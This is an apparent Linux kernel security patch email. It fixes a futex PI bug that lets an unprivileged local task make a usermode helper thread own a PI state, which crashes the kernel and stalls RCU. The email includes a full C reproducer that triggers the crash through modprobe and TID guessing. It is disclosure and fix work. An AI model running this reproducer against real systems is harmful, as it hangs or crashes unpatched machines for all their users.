Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795509684;
	b=ShlwJ9oTeS6LQKOWONSwKDFEFoRavhmJzi7VahQ4BwAI8WyjzPZlxAEBDV0lw0R5xz5c
	 fURMLz6VS0lKGy9fJ/pNfKg2Ng8/7r7I1MfA25MB47PWwzYMYTYy4diWyxdcswfkW/UPo
	 0sDCzhCuhg2UBO8ov/AXS87mqdvRAGTFpLmBqxkzqiZsvsQ+o8PT1jsytr4Db/so7Lus8
	 BNg733qSaEmakXEDMGDKfaN17wjjEjnN1KPtB3To7Jh8Dtx/TGlFIBu8D7mV9aY4aqHN0
	 RaabmRbQh38ay9yNOCVgtowu3YzJ1a1HT2xvLW12x0JPWBiWDWnCQBI5NpL6piywYiA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795509684;
	h=Received:DKIM-Signature:From:Date:Subject:MIME-Version:Content-Type:
	 Content-Transfer-Encoding:Message-Id:X-B4-Tracking:X-Change-ID:To:Cc:
	 X-Mailer:X-Developer-Signature:X-Developer-Key;
	bh=apeebde87IvbYXsVuQvaJLIxRS9FWoya5Cg3kvHJFH0=;
	b=GhW80KWApGiZ6xT99yksy6nhrpyHw3UrxGuZzZC684Iuw6Ny5z67g8cC5Iqlz8SbTZcU
	 8cHGGjF1ZL6naiVB4Mrj/gDely0P/vt+Gi9w7waeZ1HYeIioRkK7q77LHZTkAT6MqfXvs
	 Cfhnvo6qz2LyAzYitxi2JVUao0NVGMI0wd/opH2qDPMFqfJbLxWCVHDphPIt+Zc37BSbb
	 1Q4aaSBPmyID/7OMAOtyAay05L8x7zUQifF0iWHowM0NyGOOsiOx3Iwu1cWj3YdvbF+jm
	 r1oeVRiC3skTjIQGbFNt7Zy07GlYEWwOBgV3TxrsemKaEPs+ffedv5+/zb8elj5mqjQ==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dkim=pass header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=UNX4goyZ;
	arc=none smtp.remote-ip=100.103.45.18
Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C5092606A327
	for <stable@vger.kernel.org>; Tue, 24 Nov 2026 08:41:24 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=UNX4goyZ
Received: by smtp.kernel.org (Postfix) with ESMTPSA id B108F1F000C4;
	Tue, 24 Nov 2026 08:41:22 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
	s=k20260515; t=1795509684;
	bh=apeebde87IvbYXsVuQvaJLIxRS9FWoya5Cg3kvHJFH0=;
	h=From:Date:Subject:To:Cc;
	b=UNX4goyZgYLemA1GUdUzrXFN3VhHD3Hr2mDpiunpeh7sicwQ/9R6zZthAIm3x61St
	 pPRnmdJHyyXgz/+viI6HuMh1PbGvLNoTbm0nxNZlMFWcCnSSrY799wKX/50sXNXffg
	 xUq3d0qkaPthhc51s18SJb26CEfUULisRRHtUA01/JCX/xkSzJfd3f37J4s7O5MWtY
	 OlEbMJoAu57A/4HHiHz/yx+61LjOijuL21gGRyEPLC8EYSeyUIDy8ZIazfjLq0DfSQ
	 ZvL1xvxSXFOfJN68oSXThF1LxWMovzuwJrHWdijlXdI7YS3gSdhgIGDt3iMK9Hakfj
	 hE0ScjA3nO2Cw==
From: Christian Brauner <brauner@kernel.org>
Date: Tue, 24 Nov 2026 09:40:51 +0100
Subject: [PATCH] futex/pi: don't attach a PI state to a task without an mm
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Post: <mailto:stable@vger.kernel.org>
List-Help: <mailto:stable+help@vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
List-Owner: <mailto:stable+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit
Message-Id: <20261124-work-futex-pi_owner_mm-v1-1-fc302f1bc8ec@kernel.org>
X-B4-Tracking: v=1; b=H4sIAAAAAAAC/03MQQ6CMBCF4auQWTuNrcGAVzGGtGUq1VDIFISEc
 Hdb3Lj8J2++DSKxpwi3YgOmj49+CCnkqQDb6fAk9G1qUGd1lVJdcBn4jW6eaMXRN8MSiJu+R6f
 astS2qupaQnoemZxfD/j++HWczYvslLW8MDoSGtbBdvmUXXG44s8VeQX7/gWf3O9bqAAAAA==
X-Change-ID: 20261123-work-futex-pi_owner_mm-f2d55ac88991
To: Security Officers <security@kernel.org>, 
 Peter Zijlstra <peterz@infradead.org>, Thomas Gleixner <tglx@kernel.org>
Cc: Linus Torvalds <torvalds@linux-foundation.org>, 
 Ingo Molnar <mingo@redhat.com>, stable@vger.kernel.org, 
 "Christian Brauner (Amutable)" <brauner@kernel.org>
X-Mailer: b4 0.17-dev-04696
X-Developer-Signature: v=1; a=openpgp-sha256; l=12270; i=brauner@kernel.org;
 h=from:subject:message-id; bh=usdJzND+VyUBQlmjniV+2xksK3609LlFwVfraws06Ls=;
 b=owGbwMvMwCU28Zj0gdSKO4sYT6slMWSz+q6/5y6cv8eYS/FY5rNfKk3fBdmn1zlPet92L7SqV
 rvx8IOSjlIWBjEuBlkxRRaHdpNwueU8FZuNMjVg5rAygQxh4OIUgIkElzMyTJz6au+bKIfP0vkt
 m79sXnfzuOBz1y1XW2dPmHrSoeF+lQQjw44/CutXrva64X1pyn6zF4zPPdvrOed+NNLdI1s5T2A
 rNx8A
X-Developer-Key: i=brauner@kernel.org; a=openpgp;
 fpr=4880B8C9BD0E5106FC070F4F7B3C391EFEA93624

A usermode helper is exec'ed by a thread that the kernel creates with
user_mode_thread(). That thread has no mm until its exec and it isn't a
kernel thread as far as PF_KTHREAD goes. So attach_to_pi_owner() doesn't
refuse it and for a shared futex the mm of the owner isn't looked at
either. IOW, FUTEX_LOCK_PI on a shared futex uses the TID of such a
thread makes it the owner of a PI state.

When the thread execs the helper its futex cleanup finds the PI state
and exit_pi_state_list() tries to get the private hash of current->mm
which is NULL:

  BUG: kernel NULL pointer dereference, address: 0000000000000438
  RIP: 0010:futex_private_hash+0x19/0x250
  Call Trace:
   futex_exit_exec_release+0x3d9/0x650
   mm_exit_exec_release+0x11/0x110
   begin_new_exec+0x407/0xf90
   load_elf_binary+0x12a/0x1990
   bprm_execve+0x39d/0x870
   kernel_execve+0x130/0x160
   call_usermodehelper_exec_async+0xc9/0x1b0
   ret_from_fork+0x26d/0x330
   ret_from_fork_asm+0x1a/0x30

The thread dies with its futex exit_mutex held and it also dies inside
an rcu read side critical section. Fun part is, on its way out it runs
the futex cleanup again and deadlocks on that mutex:

  Call Trace:
   __schedule+0xd7/0x13f0
   schedule+0x36/0x100
   schedule_preempt_disabled+0x11/0x20
   __mutex_lock+0xfdd/0x11f0
   futex_exit_exec_release+0x36/0x650
   mm_exit_exec_release+0x11/0x110
   do_exit+0x1e8/0xc30
   make_task_dead+0x86/0x90
   rewind_stack_and_make_dead+0x16/0x20

So the thread never goes away. And because the thread never leaves its
rcu read side critical section no grace period ends anymore:

  rcu: INFO: rcu_preempt detected stalls on CPUs/tasks:
  rcu: Tasks blocked on level-0 rcu_node (CPUs 0-7): P117/1:b..l..

If the exec fails the same thing happens when the thread exits. It then
dies in the futex cleanup of do_exit() and is left behind as a dead task
that's still inside the rcu read side critical section.

This is easy to hit btw. TIDs are handed out sequentially, FUTEX_LOCK_PI
returns -ESRCH right away as long as no task has the TID and it takes no
privileges to make the kernel start a helper, e.g., by asking for a
socket of an address family that would have to come from a module. The
caller needs to be in the initial pid namespace as that's where the
helper threads get their TIDs. Alternatives would probably be the legacy
coredump usermodehelper crap.

A task without an mm hasn't run any userspace code. So it can't own a
futex. Refuse to attach a PI state to it.

Fixes: 80367ad01d93 ("futex: Add basic infrastructure for local task local hash")
Cc: stable@vger.kernel.org
Signed-off-by: Christian Brauner (Amutable) <brauner@kernel.org>
---
This fixes a NULL pointer dereference in the futex exit cleanup that
a task in the initial pid namespace can trigger without privileges.
This has not been sent to any list. I have a reproducer.
---
Yo,

I'm working on some exec changes (once again) and I stumbled upon this
while moving some stuff around.

This the braindead fix. An alternative would be to bite the bullet and
mark usermodehelpers with PF_USER_MODE_WORKER then we classify all
things that the kernel spawns:

PF_IO_WOKER
PF_USER_WORKER
PF_KTHREAD

and

PF_USER_MODE_WORKER

But given that we likely want to backport this we might want do that as
a follow-up.

Here's a reproducer:

umh-pi.c:

  // SPDX-License-Identifier: GPL-2.0
  /*
   * Make a usermode helper thread the owner of a PI futex.
   *
   * The thread the kernel creates to exec a usermode helper has no mm until
   * its exec and isn't a kernel thread as far as PF_KTHREAD goes.
   * FUTEX_LOCK_PI on a shared futex whose word names its TID attaches a PI
   * state to it. The futex cleanup of the thread at exec, or at exit if the
   * exec failed, then looks for the private futex hash of an mm it doesn't
   * have.
   *
   * The helper is modprobe, started by socket() for an address family the
   * kernel doesn't know. Its TID is the one after the TID of a child that
   * was forked right before. Everything runs as uid 1000 and has to be in
   * the initial pid namespace.
   */
  #define _GNU_SOURCE
  #include <errno.h>
  #include <fcntl.h>
  #include <grp.h>
  #include <pthread.h>
  #include <signal.h>
  #include <stdatomic.h>
  #include <stdint.h>
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <sys/mman.h>
  #include <sys/socket.h>
  #include <sys/syscall.h>
  #include <sys/wait.h>
  #include <time.h>
  #include <unistd.h>
  #include <linux/futex.h>
  #include <linux/membarrier.h>

  #define NR_LOCKERS	3
  #define NR_ROUNDS	200
  /* How long a locker waits for the lock once it is attached. */
  #define LOCK_TIMEOUT_S	3
  /* How long the whole thing gets before it counts as stuck. */
  #define STUCK_TIMEOUT_S	20

  /* Address families a defconfig kernel has no protocol for. */
  static const int families[] = { 11 /* AF_ROSE */, 9 /* AF_X25 */,
  				6 /* AF_NETROM */, 5 /* AF_APPLETALK */ };

  struct locker {
  	pthread_t thread;
  	uint32_t *word;
  	uint32_t tid;
  	int round;
  	int hit;
  };

  static atomic_int start, stop, refused;
  static struct timespec deadline;

  static double now(void)
  {
  	struct timespec ts;

  	clock_gettime(CLOCK_MONOTONIC, &ts);
  	return ts.tv_sec + ts.tv_nsec / 1e9;
  }

  static void __attribute__((noreturn)) die(const char *what)
  {
  	dprintf(1, "%s: %s\n", what, strerror(errno));
  	exit(EXIT_FAILURE);
  }

  /* The TID that was handed out last. */
  static int last_tid(void)
  {
  	pid_t pid;

  	pid = fork();
  	if (pid < 0)
  		die("fork");
  	if (pid == 0)
  		_exit(EXIT_SUCCESS);
  	if (waitpid(pid, NULL, 0) != pid)
  		die("waitpid");
  	return pid;
  }

  static int read_int(const char *path)
  {
  	char buf[32] = {};
  	int fd;

  	fd = open(path, O_RDONLY | O_CLOEXEC);
  	if (fd < 0 || read(fd, buf, sizeof(buf) - 1) <= 0)
  		return -1;
  	close(fd);
  	return atoi(buf);
  }

  /*
   * Ask for the lock until the task the word names exists. From then on the
   * call sleeps until that task gives up the lock or the timeout hits.
   */
  static void *locker(void *arg)
  {
  	struct locker *l = arg;
  	unsigned long attempts = 0;
  	int error;
  	double t;
  	long ret;

  	while (!atomic_load(&start))
  		;
  	for (;;) {
  		t = now();
  		ret = syscall(SYS_futex, l->word, FUTEX_LOCK_PI, 0, &deadline,
  			      NULL, 0);
  		error = ret ? errno : 0;
  		t = now() - t;
  		attempts++;
  		if (ret == 0 || (error != ESRCH && error != EAGAIN))
  			break;
  		if (atomic_load(&stop))
  			return NULL;
  	}

  	/*
  	 * -EPERM means the TID went to a task that can't own a futex: a kernel
  	 * thread or, with the fix, the helper thread. Everything else means
  	 * the kernel was willing to make the task the owner. The main thread
  	 * may never come back from socket(), so say it here.
  	 */
  	l->hit = error != EPERM;
  	if (!l->hit && atomic_fetch_add(&refused, 1) >= 3)
  		return NULL;
  	dprintf(1, "round %d: tid %u: FUTEX_LOCK_PI after %lu attempts: %s, slept %.3f s, word 0x%08x\n",
  		l->round, l->tid, attempts,
  		error ? strerror(error) : "got the lock", t, *l->word);
  	return NULL;
  }

  /* Whether a locker got attached to a task with the TID it asked for. */
  static int round_one(int round, uint32_t *words, int family)
  {
  	struct locker lockers[NR_LOCKERS] = {};
  	int attached = 0, last, fd, error, i;
  	double t;

  	atomic_store(&start, 0);
  	atomic_store(&stop, 0);
  	for (i = 0; i < NR_LOCKERS; i++) {
  		lockers[i].word = &words[i];
  		lockers[i].round = round;
  		if (pthread_create(&lockers[i].thread, NULL, locker, &lockers[i]))
  			die("pthread_create");
  	}

  	/* No task is created by us from here on until socket(). */
  	last = last_tid();
  	for (i = 0; i < NR_LOCKERS; i++) {
  		lockers[i].tid = last + 1 + i;
  		words[i] = lockers[i].tid;
  	}
  	clock_gettime(CLOCK_REALTIME, &deadline);
  	deadline.tv_sec += LOCK_TIMEOUT_S;
  	atomic_store(&start, 1);
  	usleep(2000);

  	t = now();
  	fd = socket(family, SOCK_DGRAM, 0);
  	error = errno;
  	t = now() - t;
  	if (fd >= 0) {
  		dprintf(1, "round %d: the kernel knows family %d\n", round, family);
  		close(fd);
  	}
  	usleep(2000);
  	atomic_store(&stop, 1);

  	for (i = 0; i < NR_LOCKERS; i++) {
  		pthread_join(lockers[i].thread, NULL);
  		attached |= lockers[i].hit;
  	}
  	if (attached)
  		dprintf(1, "round %d: socket() returned after %.3f s: %s\n",
  			round, t, fd >= 0 ? "a socket" : strerror(error));
  	return attached;
  }

  static void run(void)
  {
  	uint32_t *words;
  	int round;

  	if (setgroups(0, NULL) || setresgid(1000, 1000, 1000) ||
  	    setresuid(1000, 1000, 1000))
  		die("setresuid");

  	/* MAP_SHARED: the futex key must not be a private one. */
  	words = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
  		     MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  	if (words == MAP_FAILED)
  		die("mmap");

  	for (round = 1; round <= NR_ROUNDS; round++) {
  		int family = families[round % (sizeof(families) / sizeof(families[0]))];

  		if (round_one(round, words, family))
  			exit(EXIT_SUCCESS);
  	}
  	dprintf(1, "no task without an mm became the owner in %d rounds, -EPERM for %d TIDs\n",
  		NR_ROUNDS, atomic_load(&refused));
  	exit(2);
  }

  /*
   * membarrier() waits for an rcu grace period. It can't be killed while it
   * does, so the child is left behind if it doesn't come back.
   */
  static void probe_rcu(void)
  {
  	double t = now();
  	pid_t pid;
  	int i;

  	pid = fork();
  	if (pid < 0)
  		return;
  	if (pid == 0) {
  		syscall(SYS_membarrier, MEMBARRIER_CMD_GLOBAL, 0, 0);
  		_exit(EXIT_SUCCESS);
  	}
  	for (i = 0; i < 100; i++) {
  		if (waitpid(pid, NULL, WNOHANG) == pid) {
  			dprintf(1, "rcu: membarrier(MEMBARRIER_CMD_GLOBAL) returned after %.3f s\n",
  				now() - t);
  			return;
  		}
  		usleep(100 * 1000);
  	}
  	dprintf(1, "rcu: membarrier(MEMBARRIER_CMD_GLOBAL) has not returned after 10 s, no grace period ends\n");
  }

  int main(void)
  {
  	int tainted, status = 0, i;
  	pid_t pid;

  	tainted = read_int("/proc/sys/kernel/tainted");
  	dprintf(1, "uid %d runs as uid 1000, modprobe is %s\n", getuid(),
  		access("/sbin/modprobe", X_OK) ? "missing: the helper fails to exec" :
  						 "there: the helper execs");
  	pid = fork();
  	if (pid < 0)
  		return EXIT_FAILURE;
  	if (pid == 0)
  		run();

  	for (i = 0; i < STUCK_TIMEOUT_S * 10; i++) {
  		if (waitpid(pid, &status, WNOHANG) == pid)
  			break;
  		usleep(100 * 1000);
  	}
  	if (i == STUCK_TIMEOUT_S * 10) {
  		dprintf(1, "STUCK: no result after %d s, socket() doesn't return\n",
  			STUCK_TIMEOUT_S);
  		kill(pid, SIGKILL);
  		waitpid(pid, &status, 0);
  	}
  	i = read_int("/proc/sys/kernel/tainted");
  	dprintf(1, "tainted: %d -> %d%s\n", tainted, i,
  		(i & ~tainted & 128) ? " (D: the kernel oopsed)" : "");
  	probe_rcu();
  	if (WIFEXITED(status))
  		return WEXITSTATUS(status);
  	return EXIT_FAILURE;
  }

Thanks!
Christian
---
 kernel/futex/pi.c | 12 ++++++++++++
 1 file changed, 12 insertions(+)

diff --git a/kernel/futex/pi.c b/kernel/futex/pi.c
index 98f1b962e59a0..97cd7ec160bea 100644
--- a/kernel/futex/pi.c
+++ b/kernel/futex/pi.c
@@ -515,6 +515,18 @@ static int attach_to_pi_owner(u32 __user *uaddr, u32 uval, union futex_key *key,
 		return ret;
 	}
 
+	/*
+	 * A task without an mm that isn't a kernel thread is a user mode
+	 * thread that hasn't exec'ed yet, e.g., a usermode helper. It can't
+	 * own a futex and its exit cleanup has no mm to get the private hash
+	 * from.
+	 */
+	if (unlikely(!p->mm)) {
+		raw_spin_unlock_irq(&p->pi_lock);
+		put_task_struct(p);
+		return -EPERM;
+	}
+
 	if (IS_ENABLED(CONFIG_MMU) && futex_key_is_private(key)) {
 		/*
 		 * A private futex key holds a pointer to the waiter's mm

---
base-commit: 666539eecdf4db623f5e3c3e55cf9f2dfad24aa4
change-id: 20261123-work-futex-pi_owner_mm-f2d55ac88991

